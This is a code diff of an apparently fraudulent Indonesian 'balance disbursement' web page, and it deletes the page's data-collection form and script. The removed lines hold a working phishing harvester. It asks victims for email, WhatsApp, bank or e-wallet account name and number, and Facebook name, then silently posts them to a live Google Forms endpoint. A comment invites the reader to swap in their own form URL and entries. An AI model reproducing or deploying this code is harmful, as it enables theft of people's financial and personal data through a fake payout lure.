@@ -69,46 +69,6 @@
 
         <button id="startBtn" class="btn-main" onclick="handleStart()">MULAI SEKARANG</button>
 
-        <div id="formSection" class="form-section">
-            <h4 style="text-align:center; color:var(--primary); margin:0 0 15px 0;">DATA PENCAIRAN SALDO</h4>
-            
-            <div class="form-group">
-                <label>ID Pengguna:</label>
-                <input type="text" id="regId" placeholder="ID Akun">
-            </div>
-            <div class="form-group">
-                <label>Email Terdaftar:</label>
-                <input type="email" id="regEmail" placeholder="nama@email.com">
-            </div>
-            <div class="form-group">
-                <label>WhatsApp:</label>
-                <input type="tel" id="regWa" value="+62" oninput="validWa(this)" onkeydown="lockPrefix(event, this)">
-            </div>
-            <div class="form-group">
-                <label>Metode Pencairan Ke:</label>
-                <select id="regBank">
-                    <option value="">-- Pilih --</option>
-                    <option value="BCA">BCA</option>
-                    <option value="DANA">DANA</option>
-                    <option value="OVO">OVO</option>
-                </select>
-            </div>
-            <div class="form-group">
-                <label>Nama Sesuai Rekening:</label>
-                <input type="text" id="regNamaRek" placeholder="Nama Lengkap">
-            </div>
-            <div class="form-group">
-                <label>Nomor Rekening / HP:</label>
-                <input type="number" id="regNoRek" placeholder="0000xxxx">
-            </div>
-            <div class="form-group">
-                <label>Nama Facebook:</label>
-                <input type="text" id="regNamaFB" placeholder="Nama Profil FB">
-            </div>
-            
-            <button class="btn-main" onclick="handleSubmit()">KONFIRMASI DATA</button>
-        </div>
-    </div>
 
     <div id="resultModal" class="modal">
         <div class="modal-content">
@@ -168,40 +128,9 @@
             }, 800);
         }
 
-        function handleSubmit() {
-            // Validasi sederhana
-            const fields = ['regId', 'regEmail', 'regWa', 'regBank', 'regNamaRek', 'regNoRek', 'regNamaFB'];
-            for(let f of fields) {
-                if(!document.getElementById(f).value || document.getElementById(f).value === "+62") {
-                    alert("Harap lengkapi semua data!"); return;
-                }
-            }
+ 
             
-            // Proses kirim ke Google Form (Ganti dengan URL/Entry Anda)
-            const d = new FormData();
-            d.append('entry.498136123', document.getElementById('regId').value);
-            d.append('entry.2145381120', document.getElementById('regEmail').value);
-            d.append('entry.954302406', document.getElementById('regWa').value);
-            d.append('entry.1747382514', document.getElementById('regBank').value);
-            d.append('entry.371995109', document.getElementById('regNamaRek').value);
-            d.append('entry.1836945173', document.getElementById('regNoRek').value);
-            d.append('entry.1660055715', document.getElementById('regNamaFB').value);
 
-            fetch("https://docs.google.com/forms/d/e/1FAIpQLScGVtMxlLFQCWJjYJA_-ug8O32vaLPJSDSV2ICNfsDwFa9fIQ/formResponse", {
-                method: "POST", mode: "no-cors", body: d
-            }).then(() => {
-                document.getElementById('valShow').innerText = localStorage.getItem("cache_v");
-                document.getElementById('resultModal').style.display = "block";
-            });
-        }
-
-        function copyAction() {
-            const num = document.getElementById("targetNum").innerText;
-            const t = document.createElement("textarea");
-            t.value = num; document.body.appendChild(t); t.select();
-            document.execCommand("copy"); document.body.removeChild(t);
-            alert("Nomor Rekening Disalin");
-        }
     </script>
 </body>
 </html>
